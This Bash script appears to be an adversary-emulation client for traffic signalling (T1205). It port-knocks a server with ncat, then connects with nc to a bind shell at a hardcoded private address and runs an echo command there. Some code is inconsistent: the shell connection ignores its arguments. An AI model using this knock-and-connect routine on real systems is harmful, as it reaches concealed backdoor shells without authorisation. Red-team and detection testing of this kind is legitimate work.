#!/bin/bash

### Constants
#################################################
readonly PRINT_DEBUG=1  # Set to 0 for debug messages

### Functions
#################################################
function debug () {
  if [[ "${PRINT_DEBUG}" -eq 0 ]]; then
    echo $1 >&2
  fi
}

function knock_knock() {
  local server_ip=$1
  local knock_protocol=$2
  local knock_port_sequence=$3

  for PORT in $(echo "${KNOCK_PORT_SEQUENCE}" | tr "," " ")
  do
    if [[ "${knock_protocol}" = "udp" ]] ; then
      echo "Knock" | ncat -u -w 1s "${server_ip}" "$PORT" 2> /dev/null
    else
      echo "Knock" | ncat -w 1s "${server_ip}" "$PORT" 2> /dev/null
    fi
    debug "Knock $PORT"
    sleep 0.5s
  done
  debug "Knocks sent..."
}

function connect_to_shell () {
  local server_ip=$1
  local listening_port=$2

  #echo "echo Shell to host $HOSTNAME as user $USER successful.$(sleep 1)" | ncat ${server_ip} ${listening_port} > /tmp/t1205_client.dat
  # sleep 3
  # echo "./shell_server_echo.sh" | ncat ${server_ip} ${listening_port} 1> /tmp/t1205_client.dat 2> /dev/null
  cat <(echo 'echo Shell to host $HOSTNAME as user $USER successful') <(sleep 1) | nc "10.20.1.102" "54321" 1> /tmp/t1205_client.dat 2> /dev/null
  if [[ -s /tmp/t1205_client.dat ]] ; then
    debug "Shell was contacted!"
    echo 0
    return 0
  else
    debug "Shell not there yet..."
    echo 1
    return 1
  fi
}

### Main
#################################################
function main () {
  # Arguments
  readonly SERVER_IP=$1
  readonly KNOCK_PROTOCOL=$2
  readonly KNOCK_PORT_SEQUENCE=$3
  readonly SERVER_LISTENING_PORT=$4

  declare SHELL_CONTACTED=0
  for LOOP in {1..5} ;
  do
    debug "Try knocking... ($LOOP of max 5)"
    knock_knock $SERVER_IP $KNOCK_PROTOCOL $KNOCK_PORT_SEQUENCE
    debug "Anyone home?  Knock $LOOP of max 5."

    sleep 2s
    if [[ $(connect_to_shell $SERVER_IP $SERVER_LISTENING_PORT) -eq 0 ]]; then
      debug "Shell successfully executed with port knock"
      cat /tmp/t1205_client.dat
      exit 0
    fi
  done

  debug "Unable to bind shell after knocking multiple times"
  cat /tmp/t1205_client.dat
  exit 0
}

main "$@"